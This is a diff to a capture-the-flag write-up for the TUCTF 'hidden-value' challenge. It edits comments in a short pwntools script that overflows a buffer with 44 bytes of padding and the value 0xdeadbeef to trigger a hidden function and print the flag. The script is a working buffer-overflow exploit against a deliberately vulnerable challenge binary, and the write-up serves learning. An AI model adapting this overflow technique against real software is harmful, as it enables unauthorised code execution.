@@ -95,9 +95,9 @@ Here is the python script
 #!/usr/bin/env python3
 from pwn import *
 
-p = process('./hidden-value')
-#p = remote('chal.tuctf.com', 30011)
-param = 0xdeadbeef
+p = process('./hidden-value')  # local now cause i'm doing the writeup long time after the ctf :) 
+#p = remote('chal.tuctf.com', 30011) 
+param = 0xdeadbeef # the word that we want to inject to execute hidden_command() and take the flag
 padding = b'a' * 44
 
 payload = flat(
@@ -106,9 +106,9 @@ payload = flat(
 	)
 
 p.sendline(payload)
-success(print(p.recvall()))
-
+print(p.recvall())
 ```
+
 ```console
 ┌──(vein㉿vein)-[~/tuctf/pwn_hidden-value]
 └─$ ./exploit.py
